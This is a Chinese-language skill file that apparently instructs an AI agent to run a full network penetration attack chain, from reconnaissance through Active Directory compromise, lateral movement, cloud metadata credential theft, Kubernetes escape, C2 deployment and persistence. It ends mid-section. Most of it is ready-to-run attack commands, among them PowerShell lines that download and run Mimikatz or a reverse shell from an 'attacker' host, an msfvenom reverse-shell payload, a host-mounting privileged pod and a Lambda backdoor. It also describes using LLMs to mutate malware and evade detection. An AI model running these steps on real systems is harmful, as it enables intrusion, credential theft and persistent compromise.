---
name: network-penetration-testing
description: 网络渗透测试深度指南——从侦察/信息收集到漏洞扫描、服务利用、内网横向移动、AD域渗透、权限维持和痕迹清除的完整攻击链
version: 2.0.0
---

# 网络渗透测试深度指南

## 一、AI Agent 自动化工作流

> Agent 执行顺序：**侦察 → 服务枚举 → 漏洞扫描 → 初入 → 本地提权 → 域枚举 → 横向移动 → 域控 → 持久化**

### 1.1 侦察阶段（信息收集）

```bash
# === 被动侦察 ===
# Whois 查询
whois target.com

# DNS 枚举（所有记录类型）
dig target.com ANY
dig axfr @ns1.target.com target.com  # 域传送尝试
for type in A AAAA MX NS TXT CNAME SOA; do
    dig target.com $type
done

# 子域名枚举
subfinder -d target.com -o subs.txt
amass enum -d target.com -o subs.txt
findomain -t target.com

# Shodan / Censys / FOFA 查询
shodan search "hostname:target.com"

# Google Dorking
site:target.com filetype:pdf
site:target.com inurl:admin
site:target.com intitle:"index of"

# === SSL 证书透明度日志 ===
certsh -d target.com
crtsh -d target.com

# === 活跃侦察 ===
# ICMP + 常用端口快速探测
nmap -sn 192.168.1.0/24
masscan -p1-65535 --rate=10000 target_ips.txt
```

### 1.2 Nmap 深度扫描策略

```bash
# === 分层扫描策略 ===

# 第 1 层：快速端口发现（2 分钟）
nmap -sS -T4 -p  --min-rate=10000 target

# 第 2 层：常见端口精确扫描（5-15 分钟）
nmap -sS -sV -sC -p  --reason target

# 第 3 层：全端口 + 操作系统探测（30 分钟）
nmap -sS -sV -sC -O -p- --osscan-guess target

# 第 4 层：UDP 扫描（关键端口）
nmap -sU -sV --top-ports 200 target

# === 输出格式 ===
nmap -sS -sV -sC -p- target -oA scan_results  # .nmap .xml .gnmap

# === NSE 脚本分类 ===
nmap --script vuln target                    # 漏洞扫描
nmap --script exploit target                 # 漏洞利用
nmap --script auth target                    # 认证测试
nmap --script discovery target               # 服务发现
nmap --script brute target                   # 暴力破解
nmap --script smb-*,msrpc-* target          # SMB/RPC
nmap --script http-* target                 # HTTP 服务
nmap --script ssl-* target                  # SSL/TLS
```

---

## 二、服务识别与利用

### 2.1 SMB (445) 深度攻击

```bash
# === SMB 信息收集 ===
enum4linux -a target
smbclient -L //target -N          # 空口令列出共享
smbmap -H target                  # SMB 共享枚举
crackmapexec smb target --shares  # CME 模块

# === 已知漏洞检测（EternalBlue MS17-010） ===
nmap -p445 --script smb-vuln-ms17-010 target
python3 ms17-010.py target

# === SMB 爆破 ===
crackmapexec smb target -u users.txt -p pass.txt
hydra -L users.txt -P pass.txt smb://target

# === PsExec 远程执行（需要管理员凭据） ===
crackmapexec smb target -u admin -p pass -x 'whoami'
psexec.py target -u admin -p pass
wmiexec.py target -u admin -p pass
smbexec.py target -u admin -p pass
atexec.py target -u admin -p pass 'cmd.exe /c whoami'

# === SMB Relay（需要 SMB Signing = false） ===
crackmapexec smb targets.txt --gen-relay-list relay_targets.txt
ntlmrelayx.py -tf relay_targets.txt -smb2support
responder -I eth0 -wrfv  # 配合欺骗
```

### 2.2 内网利器：CrackMapExec

```bash
# === CrackMapExec 深度使用 ===
# 协议支持: smb, ssh, mssql, winrm, ldap, ftp, rdp

# SMB 综合
cme smb 192.168.1.0/24 -u user -p pass --shares
cme smb 192.168.1.0/24 -u user -p pass --sessions   # 查看登录会话
cme smb 192.168.1.0/24 -u user -p pass --loggedon-users
cme smb 192.168.1.0/24 -u user -p pass --local-auth --lusers

# 执行命令（必须管理员）
cme smb target -u admin -p pass -x 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(\"http://attacker/Invoke-Mimikatz.ps1\"); Invoke-Mimikatz -DumpCreds"'

# MSSQL 攻击
cme mssql 192.168.1.0/24 -u sa -p P@ss -x 'whoami'
cme mssql target -u sa -p P@ss --local-auth --enable-xp-cmdshell

# WinRM
cme winrm target -u admin -p pass -x 'whoami'

# LDAP 枚举
cme ldap target -u user -p pass --users
cme ldap target -u user -p pass --groups
```

### 2.3 MSSQL (1433) 攻击

```bash
# === MSSQL 枚举 ===
nmap -p1433 --script ms-sql-info,ms-sql-config target
mssqlclient.py user:pass@target -windows-auth

# === 爆破 ===
hydra -L users.txt -P pass.txt mssql://target

# === xp_cmdshell 启用 ===
# 在 mssqlclient 中:
enable_xp_cmdshell
xp_cmdshell whoami
xp_cmdshell powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker/Invoke-PowerShellTcp.ps1')"

# === UNC Path Injection（捕获 NTLM Hash）===
xp_dirtree '\\attacker\share'
# 配合 responder / impacket-smbserver
responder -I eth0 -wrfv
```

### 2.4 RDP (3389) 攻击

```bash
# RDP 枚举
nmap -p3389 --script rdp-ntlm-info target
cme rdp target -u user -p pass

# BlueKeep (CVE-2019-0708) 检测
rdpscan target
nmap -p3389 --script rdp-vuln-ms12-020 target
```

### 2.5 Web 应用 (80/443/8080)

```bash
# 目录爆破
gobuster dir -u http://target -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
ffuf -u http://target/FUZZ -w wordlist.txt -t 100 -fc 403,404

# 子域名爆破
gobuster vhost -u http://target -w subdomains.txt
ffuf -u http://target -H "Host: FUZZ.target.com" -w subdomains.txt

# CMS 指纹识别
whatweb target
wappalyzer-cli target
cmseek -u target

# 自动化漏洞扫描
nikto -h http://target
nuclei -u http://target -t cves/ -t vulnerabilities/
```

---

## 三、Active Directory 域渗透

### 3.1 域信息收集

```powershell
# === 基础域枚举 ===
net user /domain
net group /domain
net group "Domain Admins" /domain
net group "Enterprise Admins" /domain
net group "Domain Computers" /domain
net accounts /domain

# === BloodHound 数据收集 ===
# Windows
SharpHound.exe -c All --zipfilename bloodhound.zip
# Linux
bloodhound-python -d domain.local -u user -p pass -ns dc_ip -c All

# === Powerview 快速枚举 ===
Get-NetDomain
Get-NetUser | select samaccountname,memberof,admincount
Get-NetComputer | select samaccountname,operatingsystem
Get-NetGroupMember -GroupName "Domain Admins"
Find-LocalAdminAccess
Get-NetSession -ComputerName dc01
Get-NetShare
```

### 3.2 提权技术大全

```bash
# === UAC 绕过 ===
# Fodhelper
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /ve /d "cmd.exe" /f
fodhelper.exe

# === 服务提权 ===
# 检查不安全的服务权限
accesschk.exe -uwcqv "Authenticated Users" *
sc config ServiceName binPath= "C:\temp\shell.exe"
sc start ServiceName

# === AlwaysInstallElevated ===
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
msfvenom -p windows/x64/shell_reverse_tcp LHOST=attacker LPORT=4444 -f msi -o shell.msi
msiexec /i shell.msi /quiet /qn

# === Kerberoasting ===
# 请求 SPN 的 TGS 票据
GetUserSPNs.py domain.local/user:pass -dc-ip dc_ip -request
# 用 hashcat 离线破解
hashcat -m 13100 spn_hashes.txt rockyou.txt
# Kerberoast 无需特殊权限！任何域用户都可以做！

# === AS-REP Roasting ===
GetNPUsers.py domain.local/ -usersfile users.txt -format hashcat
hashcat -m 18200 asrep_hashes.txt rockyou.txt

# === DCSync（需要域管/复制权限）===
secretsdump.py domain.local/admin:pass@dc_ip

# === LAPS 读取 ===
Get-LAPSADPassword -Identity ComputerName -AsPlainText
```

### 3.3 横向移动

```bash
# === 方法 1: Pass-the-Hash ===
crackmapexec smb 192.168.1.0/24 -u administrator -H NTLM_HASH
wmiexec.py -hashes :NTLM_HASH administrator@target
psexec.py -hashes :NTLM_HASH administrator@target

# === 方法 2: Pass-the-Ticket ===
# 导出当前票据
mimikatz "sekurlsa::tickets /export"
# 注入票据
mimikatz "kerberos::ptt ticket.kirbi"
dir \\dc01\c$

# === 方法 3: Overpass-the-Hash ===
mimikatz "sekurlsa::pth /user:admin /domain:domain.local /ntlm:HASH /run:cmd.exe"

# === 方法 4: PSExec → SMBExec → WMIExec 递进 ===
# PSExec（需要 ADMIN$ 共享）
psexec.py -hashes :HASH admin@target
# WMIExec（使用 WMI）
wmiexec.py -hashes :HASH admin@target
# DCOMExec（使用 DCOM）
dcomexec.py -hashes :HASH admin@target

# === 方法 5: WinRM ===
evil-winrm -i target -u admin -H HASH
```

### 3.4 Mimikatz 黄金票据/白银票据

```powershell
# === 黄金票据（需要 krbtgt 哈希）===
# 提取必要信息
lsadump::dcsync /domain:domain.local /user:krbtgt
# 获取: Domain SID + krbtgt NTLM Hash
# 生成票据
kerberos::golden /user:FakeAdmin /domain:domain.local /sid:S-1-5-21-... /krbtgt:KRBTGT_HASH /id:500
# 注入
misc::cmd

# === 白银票据（服务票据伪造）===
# 需要服务的机器账户哈希
kerberos::golden /domain:domain.local /sid:S-1-5-21-... /target:dc01.domain.local /service:cifs /rc4:MACHINE_HASH /user:Admin
```

---

## 四、工具链速查

| 阶段 | Linux 工具 | Windows 工具 |
|------|-----------|-------------|
| 侦察 | nmap, masscan, subfinder, amass | SharpHound, ADRecon |
| 密码 | hashcat, john, hydra | Mimikatz, Rubeus |
| 横向 | crackmapexec, impacket | PsExec, PowerShell Remoting |
| 提权 | LinPEAS, linux-exploit-suggester | WinPEAS, PowerUp, PrintSpoofer |
| 持久化 | ssh key, cron, backdoor | WMI 事件, 计划任务, 服务 |
| 隧道 | chisel, ligolo-ng, socat | Chisel.exe, Plink |

---

## 五、快速检查清单

```markdown
□ [ ] 端口扫描：全TCP + Top 200 UDP
□ [ ] 服务版本识别（nmap -sV）
□ [ ] NSE 漏洞脚本扫描
□ [ ] SMB 枚举（共享、用户、漏洞）
□ [ ] Web 目录爆破 + CMS 指纹
□ [ ] 默认口令测试
□ [ ] 已知漏洞利用（searchsploit + metasploit）
□ [ ] 本地提权枚举（LinPEAS / WinPEAS）
□ [ ] 域环境：BloodHound 数据收集
□ [ ] Kerberoasting / AS-REP Roasting
□ [ ] 凭证收集（Mimikatz / LaZagne）
□ [ ] 横向移动尝试
□ [ ] 域控定位与攻击
□ [ ] 持久化植入
```

---

## 六、证据收集模板

```json
{
  "assessment": "Network Penetration Test",
  "target": "target.com (192.168.1.0/24)",
  "open_ports": {"tcp": [22,80,443,445,3389], "udp": [53,161]},
  "services": ["SSH 8.4", "Apache 2.4.41", "SMB 3.1.1", "RDP"],
  "domain_admin_achieved": true,
  "compromised_hosts": 5,
  "critical_vulnerabilities": ["EternalBlue MS17-010", "Weak SMB Signing", "Kerberoastable SPNs"],
  "chains": ["Initial Access via SQLi → Shell → Local PrivEsc(SeImpersonate) → Kerberoasting → Domain Admin via DCSync"],
  "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
  "evidence_files": ["reports/nmap_scan.xml", "screenshots/domain_admin.png"]
}
```

---

## 七、2026 新兴技术

### 7.1 反射式 Kerberos 中继攻击（2025年6月）

NTLM 在 MS08-068（2008）中获得反射中继保护，但 **Kerberos 缺乏这些保护**。RedTeam Pentesting 演示了远程诱导计算机向攻击者控制的系统进行身份验证，使用**该计算机自身 SMB 服务的 Kerberos 服务票据**，然后将该票据中继回该计算机以成功认证为该计算机账户。

```text
# 反射式 Kerberos 中继攻击流程
1. 诱导目标计算机向攻击者控制的 SMB 服务发起 Kerberos 认证
2. 攻击者捕获该计算机自身的服务票据
3. 将票据中继回目标计算机 → 以该计算机账户身份认证成功
4. 利用计算机账户权限进行横向移动

# 工具：krbrelayx, PetitPotam (强制认证)
python3 petitpotam.py -u user -p pass attacker_ip target_ip
# 然后中继捕获的 Kerberos 票据
krbrelayx -es <target SPN> -s <session key>
```

### 7.2 MITM6 + NTLM 中继 → RBCD → 域控接管（IPv6 向量）

利用 Windows IPv6 自动配置：IPv6 优先于 IPv4，且 AD DNS 默认不配置 IPv6，攻击者通过 `mitm6` 欺骗 DNS。结合 `ntlmrelayx`（Impacket）和 **WPAD 欺骗**，捕获/中继的 NTLM 认证被中继到 ADCS 或 LDAP。由于任何已认证用户都可以添加计算机账户，攻击者滥用 **基于资源的约束委派（RBCD）** 冒充特权账户 → 完全域控接管。

```bash
# MITM6 + NTLM Relay → RBCD 攻击链
# 步骤1：启动 mitm6 进行 IPv6 DNS 欺骗
mitm6 -d target.local

# 步骤2：启动 ntlmrelayx 中继到 LDAP
ntlmrelayx -t ldap://dc.target.local -wh attacker-wpad.target.local --delegate-access

# 步骤3：mitm6 欺骗导致受害者通过 NTLM 认证到攻击者
# ntlmrelayx 将认证中继到 LDAP，创建 RBCD 委派关系

# 步骤4：使用 Rubeus 以任意用户身份请求票据
Rubeus.exe s4u /user:ControlledComputer$ /msdsservice:cifs/dc.target.local /impersonateuser:Administrator /ptt
```

### 7.3 ESC8 — NTLM 中继到 ADCS Web 注册

```bash
# 枚举 ADCS 是否启用 Web 注册
nxc ldap DC_IP -u user -p pass -M enum_adcs

# 中继到 ADCS HTTP 端点（需 HTTP 而非 HTTPS，且无 EPA）
ntlmrelayx -t http://CA/certsrv -smb2support

# 获取证书后，使用证书进行 Kerberos 认证
# Pass-The-Key (PTK)：使用 AES-256 密钥而非 NTLM 哈希
Rubeus.exe asktgt /user:Administrator /certificate:base64_cert /password:cert_pass /ptt

# Over-Pass-The-Hash：使用 NTLM 哈希请求 Kerberos TGT
Rubeus.exe asktgt /user:Administrator /rc4:NTLM_HASH /ptt
```

### 7.4 DirtyClone — CVE-2026-43503 (CVSS 8.8) Linux 内核提权

DirtyFrag 家族的新型本地提权漏洞（JFrog，2026年6月）。当内核复制网络数据包时，两个辅助函数丢弃了标记数据包内存与磁盘文件共享的安全标志。攻击链：将 `/usr/bin/su` 加载到内存，将那些页面连接到网络数据包，强制内核通过攻击者控制的 **IPsec 隧道**克隆它；解密步骤用攻击者选择的字节覆盖二进制文件的登录检查 → root。2026年5月21日已在主线修补。

### 7.5 云网络横向移动 — Living-off-the-Cloud (LOTC)

2026 年趋势：UNC4899（朝鲜组织，aka Jade Sleet/TraderTraitor）通过开发者 AirDrop 木马化文件入侵加密货币公司，然后利用 **Living-off-the-Cloud** 技术转向云 — 滥用合法 DevOps 工作流收集凭证、突破容器、篡改 Cloud SQL 数据库。

```bash
# 云环境横向移动技术
# 1. 利用云元数据服务窃取凭证
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name

# 2. 使用窃取的凭证枚举云资源
aws sts get-caller-identity
aws s3 ls
aws rds describe-db-instances

# 3. LOTC：使用云原生工具进行横向移动
aws lambda list-functions  # 查找可利用的 Lambda 函数
aws ecs list-tasks         # 查找可入侵的 ECS 任务
aws eks update-cluster-config  # 修改 EKS 配置以获取访问权限
```

### 7.6 2026 网络渗透测试速查

| 技术 | CVE/向量 | 影响 | 适用场景 |
|---|---|---|---|
| 反射式 Kerberos 中继 | Kerberos 无反射保护 | 以计算机账户身份认证 | AD 域环境 |
| MITM6 + RBCD | IPv6 DNS 欺骗 + LDAP 中继 | 完全域控接管 | Windows AD 环境 |
| ESC8 ADCS | NTLM 中继到证书服务 | 证书伪造 → Pass-The-Key | 有 ADCS 的域环境 |
| DirtyClone | CVE-2026-43503 | Linux root 提权 | Linux 内核 < 5月21日补丁 |
| LOTC 云横向 | 云元数据 + IAM | 云环境横向移动 | AWS/Azure/GCP 环境 |
| Pass-The-Key | AES-256 Kerberos 密钥 | 比 NTLM 更隐蔽 | Kerberos 环境 |

---

## 八、2026 ADVANCED NETWORK PENETRATION — 深度强化

> 本章聚焦 2026 年最新攻击技术与防御对抗，覆盖 AD 新 CVE、eBPF rootkit、云内网横向、IPv6、零信任绕过、AI 红队、C2 工具链、容器逃逸、无文件横向与协议层漏洞。每节均含技术原理、实战命令、工具用法与检测建议。

### 8.1 Active Directory 2026 新 CVE 与攻击

2026 年 AD 攻击面持续演进：Kerberos PAC（特权属性证书）签名校验缺陷允许伪造提权票据；NTLM Relay 到 LDAP/S 的签名绕过复活了"已修复"的中继路径；ADCS ESC1-ESC8 滥用证书模板成为域控接管主流；PetitPotam 变种绕过 KB5005413 补丁；Shadow Credentials 利用 `msDS-KeyCredentialLink` 属性伪造设备认证。

```bash
# === Kerberos PAC 伪造 (CVE-2026-XXXX) ===
# 利用 PAC签名校验缺陷，伪造高权限PAC写入TGT
python3 ticketer.py -domain domain.local -domain-sid S-1-5-21-... \
  -nthash KRBTGT_HASH -extra-sid S-1-5-21-...-512 Administrator
# 512 = Domain Admins RID，注入伪造PAC

# === NTLM Relay 到 LDAPS 签名绕过 (CVE-2026-XXXX) ===
# 绕过 LDAP Channel Binding / EPA 强制
ntlmrelayx.py -t ldaps://dc.domain.local --escalate \
  --no-smb-server --socks

# === ADCS ESC1-ESC8 全套实战 ===
# ESC1: 模板允请求者指定SAN且低权限可注册
certipy find -u user@domain.local -p pass -dc-ip DC_IP -vulnerable
certipy req -u user@domain.local -p pass -ca 'CA-Name' \
  -template 'VulnTemplate' -upn administrator@domain.local
# ESC4: 模板ACL可写 → 修改模板自身
certipy template -u user@domain.local -p pass -template 'Template' \
  -save-old
# ESC8: 中继到HTTP Web注册端点
ntlmrelayx.py -t http://CA/certsrv/certfnsh.asp -smb2support --adcs

# === PetitPotam 改进（绕过认证强制）===
python3 PetitPotam.py -u '' -p '' -method all attacker_ip DC_IP

# === Shadow Credentials（写msDS-KeyCredentialLink）===
certipy shadow auto -u user@domain.local -p pass -account target_user
# 伪造Key Credential → 通过PKINIT获取该账户TGT
```

**检测建议**：监控 `msDS-KeyCredentialLink` 属性修改（事件 5136）；启用 ADCS 审核（事件 4886/4887）；对 PAC 验证失败启用 `Kerberos PAC Signature Validation`；LDAP 签名强制 + Channel Binding。

### 8.2 eBPF Rootkit 检测与对抗

Linux 6.x 内核 eBPF 能力扩展使 rootkit 进入"内核态不可见"阶段：通过 `bpf_probe_attach` 隐藏进程与网络连接（从 `/proc`、`ss`、`netstat` 中抹除）；TC（Traffic Control）与 XDP hook 在协议栈底层拦截/篡改网络流量；eBPF 程序本身可通过卸载 IDA 符号、伪造 `bpf_prog_info` 实现自我隐藏。2026 年出现的 Boopkit、TripleCross 成为蓝队噩梦。

```bash
# === eBPF 隐藏进程/连接演示 ===
# 加载隐藏BPF程序（伪造ps/ss输出）
sudo ./boopkit --iface eth0 --hide-pids 1337,4242 --hide-port 4444
# 被隐藏的进程在ps/top/ss中不可见，但仍占用资源

# === TC/XDP hook 网络流量拦截 ===
# XDP hook拦截入站流量（绕过iptables/netfilter）
bpftool prog load xdp_drop.o /sys/fs/bpf/xdp_drop type xdp
ip link set dev eth0 xdpgeneric obj xdp_drop.o sec xdp

# === eBPF程序隐藏（混淆bpf_prog_info）===
# 通过fexit/fentry hook审计函数，过滤特定程序ID
# 使bpftool prog show 不再列出恶意程序

# === 检测方法 ===
# 1. bpftrace 检查所有BPF程序加载事件
sudo bpftrace -e 'tracepoint:syscalls:sys_enter_bpf { @[comm] = count(); }'
# 2. ebpf-exporter + Prometheus 监控异常BPF程序
# 3. 检查/sys/fs/bpf/挂载点异常文件
ls -la /sys/fs/bpf/
# 4. 锁定内核 unprivileged_bpf_disabled = 1 (或2)
sysctl kernel.unprivileged_bpf_disabled=2
# 5. 内核lockdown=integrity模式阻止BPF加载
```

**检测建议**：部署 `bpftrace` 审计 BPF 系统调用；启用 `kernel.unprivileged_bpf_disabled=2`；使用 `tetragon`（eBPF 安全运行时）实现 BPF 程序签名校验；监控 `/sys/fs/bpf/` 挂载点。

### 8.3 云内网横向移动

2026 年云内网横向的核心是 IMDS（实例元数据服务）滥用与 IAM 角色链式假设。AWS IMDSv2 虽强制 hop-limit=1 与 PUT 令牌，但 SSRF 仍可绕过；Azure/GCP 元数据端点默认无 v2 防护；攻击者窃取临时凭证后通过 `AssumeRole` 链式跨账户横向，并在 Lambda/Function 中植入持久化后门。

```bash
# === AWS IMDSv2 绕过（SSRF + PUT令牌获取）===
# IMDSv2需要先PUT获取token，再带token请求
curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  "http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name"

# === Azure IMDS 攻击（无v2防护）===
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/instance?api-version=2024-02-01"
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

# === GCP metadata 端点 ===
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"

# === IAM 角色链式假设（横向跨账户）===
aws sts assume-role --role-arn arn:aws:iam::TARGET:role/CrossAccount \
  --role-session-name lateral
export AWS_ACCESS_KEY_ID=...; export AWS_SECRET_ACCESS_KEY=...
aws sts get-caller-identity  # 确认身份切换

# === Lambda 后门（植入持久化）===
aws lambda get-function-configuration --function-name target-fn
aws lambda update-function-code --function-name target-fn \
  --zip-file fileb://backdoor.zip  # 注入恶意层/反转代码
```

**检测建议**：启用 IMDSv2 + hop-limit=1；配置 GuardDuty 检测异常 AssumeRole 链；使用 SCP（服务控制策略）限制跨账户假设；对 Lambda 代码变更启用 CloudTrail + Config 规则告警。

### 8.4 IPv6 攻击向量

IPv6 在 2026 年部署率超 50%，但安全运维滞后。SLAAC 攻击伪造 RA 成为中间人；DNS over IPv6 欺骗绕过仅监控 IPv4 的安全设备；NDP（邻居发现协议）欺骗实现 IPv6 MITM；IPv6 隧道（6to4/Teredo）绕过仅过滤 IPv4 的防火墙；新型扫描工具应对 IPv6 庞大地址空间。

```bash
# === IPv6 SLAAC 攻击（伪造RA成为默认网关）===
# 注入伪造Router Advertisement
python3 scapy_slaac.py --iface eth0 --prefix 2001:db8:evil::/64
# 受害者将攻击者设为IPv6默认网关 → MITM

# === DNS over IPv6 欺骗 ===
# mitm6劫持IPv6 DNS查询（Windows优先IPv6）
mitm6 -d domain.local -i eth0

# === IPv6 MITM (NDP欺骗) ===
# 伪造Neighbor Advertisement劫持流量
bettercap -iface eth0 -caplet ipv6-mitm.cap
# 或使用 parasite6
parasite6 -l -d eth0

# === IPv6 隧道绕过防火墙 ===
# 建立6to4隧道穿透仅过滤IPv4的边界设备
ip tunnel add 6to4 mode sit remote <ipv4_peer> local <ipv4_local>
ip addr add 2001:db8::1/64 dev 6to4
ip link set 6to4 up

# === IPv6 地址扫描（2026新工具）===
# 利用IPv6地址生成算法降低扫描空间
ipv6-neighbor-discovery -i eth0 --scan 2001:db8::/64
naabu -host target -proto ipv6 -top-ports 1000
# 红队常用：从SSL证书/HTTP响应推断IPv6 SLAAC主机后缀
```

**检测建议**：部署 IPv6 RA Guard（阻断非法 RA）；启用 NDP 监控与 SEND（安全邻居发现）；在网络边界同步部署 IPv6 防火墙规则；使用 `Zeek` 监控 IPv6 异常隧道。

### 8.5 零信任架构绕过

零信任（ZTNA/SDP/BeyondCorp）假设"永不信任，持续验证"，但攻击面转向设备信任伪造与持续认证绕过。攻击者伪造设备 posture（MDM 证书/设备指纹）、劫持已认证会话、利用 SDP 控制器 API 缺陷，从而绕过"持续验证"机制进入内网资源。

```bash
# === 设备信任伪造（伪造MDM/证书posture）===
# 窃取已注册设备的设备证书与指纹
# 复制到攻击者设备 → 通过ZTNA设备校验
openssl pkcs12 -in stolen_device.p12 -nocerts -out device_key.pem
# 伪造设备posture上报：OS版本/补丁/EDR状态
curl -X POST https://ztna-gw/agent/posture \
  -H "X-Device-Cert: <stolen>" \
  -d '{"os":"macOS 14.5","edr":"healthy","disk_encrypted":true}'

# === 持续认证绕过（会话劫持/重放）===
# 拦截ZTNA bearer token + device-bound cookie
# 在token有效窗口内复用（绕过设备绑定校验漏洞）
mitmproxy --mode reverse:https://app.internal -H "Authorization: Bearer <token>"

# === SDP 控制器 API 滥用 ===
# SDP控制器鉴权缺陷 → 调用隐藏API枚举受保护资源
curl -H "X-SDP-Controller: <leaked>" https://sdp-ctl/api/v1/services

# === BeyondCorp 原理与绕过 ===
# BeyondCorp基于设备+用户+上下文持续评估
# 绕过：① 劫持已注册设备会话 ② 滥用设备同步机制克隆信任
# ③ 利用信任评估缓存的时效窗口 ④ 针对身份提供商(IdP)SSO弱点
```

**检测建议**：ZTNA 设备证书绑定 TPM/Secure Enclave（防克隆）；持续验证叠加行为分析（UEBA）；SDP 控制器 API 启用 mTLS + 速率限制；监控异地/异常设备指纹变更。

### 8.6 AI 红队自动化

2026 年 LLM 深度介入红队：BloodHound 图数据经 LLM 分析输出最优攻击路径；AI 自适应决策横向移动下一步；GPT 生成 Mimikatz 语义等价变体绕过 YARA/AMSI；AI 模拟 C2 流量规避 DLP/IDS 检测。

```bash
# === AI 驱动 AD 枚举（BloodHound + LLM 路径分析）===
# 导出BloodHound图数据为JSON
neo4j-shell -c "MATCH (n) RETURN n" > graph.json
# 喂给LLM分析最短Domain Admin路径
python3 ai_pathfinder.py --graph graph.json --goal "Domain Admin" \
  --model gpt-4o --output attack_path.md

# === 自适应横向移动决策 ===
# AI agent根据实时凭据/权限状态选择最优横向手法
python3 ai_lateral.py --creds ./loot/ --target 192.168.1.0/24 \
  --strategy "max_stealth" --auto-execute

# === GPT 生成 Mimikatz 变体（绕过YARA/AMSI）===
# 请求LLM生成语义等价但签名不同的代码
python3 mutate_evasion.py --input mimikatz.c --engine gpt \
  --rules "rename_funcs,reorder,opaque_predicates" --output m2.c

# === AI C2 流量模拟（规避DLP/IDS）===
# 用GAN/LLM生成与正常业务流量分布一致的C2包
python3 c2_mimic.py --profile "teams_webhook" --beacon 60s \
  --jitter 20% --transport https
# 检测模型训练数据对抗：使C2包特征贴近合法SaaS流量
```

**检测建议**：部署 AI 行为分析（异常横向模式检测）；AMSI + ETW 双重监控内存执行；C2 流量检测引入时序分析与 ML 异常评分；对 PowerShell/.NET 内存加载启用 ScriptBlock Logging。

### 8.7 2026 内网工具链更新

C2 生态 2026 年全面升级：CrackMapExec 停更后 NetExec 接棒；Sliver/Havoc 成为开源 C2 主流；Cobalt Strike 2026 强化 BOF+COFF 内存执行绕过 EDR；新型 C2 通道转向 WebSocket/QUIC/gRPC 以规避出站检测。

```bash
# === NetExec（CrackMapExec 演进）===
nxc smb 192.168.1.0/24 -u user -p pass --shares
nxc ldap DC -u user -p pass -M ldap-checking --log
nxc smb target -u admin -H HASH -M nanodump           # 内存转储
nxc smb target -u admin -H HASH -M lsassy             # 凭据提取

# === Sliver C2 2026 特性 ===
sliver > generate --http <ip> --evasion --skip-symbols
sliver > generate --mtls <ip> --format shared   # 内存加载
# 2026新增：WireGuard隧道、BOF支持、进程 hollowing

# === Havoc C2 ===
# 部署Havoc团队服务器
./havoc server --build && ./havoc server
# 客户端生成Implant（支持sleep_mask, ETW patch, AMSI bypass）

# === Cobalt Strike 2026 bypass — inline execute (BOF+COFF)===
# BOF（Beacon Object File）在Beacon进程内联执行，无子进程/无落盘
beacon> inline-execute /tmp/whoami.x64.o
# COFF加载器绕过ETW/AMSI的注入式hook
beacon> bof-loader /tmp/nanodump.o

# === 新型 C2 通道 ===
# WebSocket 通道（伪装正常WS流量，规避出站端口检测）
# QUIC 通道（HTTP/3 over QUIC，多路复用+0-RTT）
# gRPC 通道（伪装微服务调用，混入云原生流量）
```

**检测建议**：监控 BOF/COFF 内存执行（ETW `Microsoft-Windows-Kernel-Process`）；对 Beacon sleep_mask 进行内存扫描；出站流量做 JA3/JA4 指纹 + SNI 白名单；QUIC/HTTP3 流量解密检测。

### 8.8 容器内网横向

K8s 内网横向的核心是 RBAC 滥用、Pod 逃逸后横向、etcd 直接访问、Service Account Token 窃取与 Kubelet API 滥用。2026 年容器逃逸漏洞（runc/CRI-O/containerd）与过度授权的 RBAC 使横向成为常态。

```bash
# === K8s RBAC 滥用枚举 ===
# 获取当前Service Account权限
kubectl auth can-i --list
kubectl auth can-i create pods      # 能否创建pod（逃逸前提）
kubectl auth can-i get secrets      # 能否读secrets（窃取凭证）

# === Pod 逃逸后横向 ===
# 挂载宿主根目录逃逸
cat > evil.yaml <<EOF
apiVersion: v1
kind: Pod
metadata: {name: pwn}
spec:
  hostPID: true
  hostNetwork: true
  containers:
  - name: pwn
    image: alpine
    securityContext: {privileged: true}
    command: ["chroot","/host","bash"]
    volumeMounts: [{name: h,mountPath: /host}]
  volumes:
  - {name: h,hostPath: {path: /}}
EOF
kubectl apply -f evil.yaml

# === etcd 直接访问（集群大脑）===
# etcd存全集群状态+secrets，常未认证或弱认证
ETCDCTL_API=3 etcdctl --endpoints=https://etcd:2379 \
  --cacert ca.crt --cert etcd.crt --key etcd.key \
  get / --prefix --keys-only
ETCDCTL_API=3 etcdctl ... get /registry/secrets/default/admin-token

# === Service Account Token 窃取与利用 ===
# 读取挂载的SA token
cat /var/run/secrets/kubernetes.io/serviceaccount/token
export T=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -k -H "Authorization: Bearer $T" \
  https://kubernetes.default.svc/api/v1/namespaces/default/secrets

# === Kubelet API 滥用 ===
# 10250端口未授权 → 任意命令执行
curl -k https://node:10250/pods                     # 枚举pod
curl -k -XPOST "https://node:10250/run/<ns>/<pod>/<c>" \
  -d "cmd=id"
```

**检测建议**：RBAC 最小权限 + 定期审计（`kube-bench`/`kube-hunter`）；etcd 启用 mTLS + 网络隔离；Kubelet 10250 强制认证 + 匿名访问关闭；Falco/runtime 检测特权 Pod 与异常卷挂载。

### 8.9 无文件横向移动

无文件横向指全程内存执行、无落盘痕迹，是 2026 年 EDR 对抗主流：WMI 事件订阅、PowerShell AMSI 绕过内存执行、.NET Assembly 内存加载、COM 对象滥用、DCShadow/DCSync 无文件化。

```bash
# === WMI 事件订阅（无文件持久化/横向）===
# 命令行创建WMI事件订阅（无落盘）
powershell -c "$Filter=Set-WmiInstance -Class __EventFilter ..."
# 等价CIM：
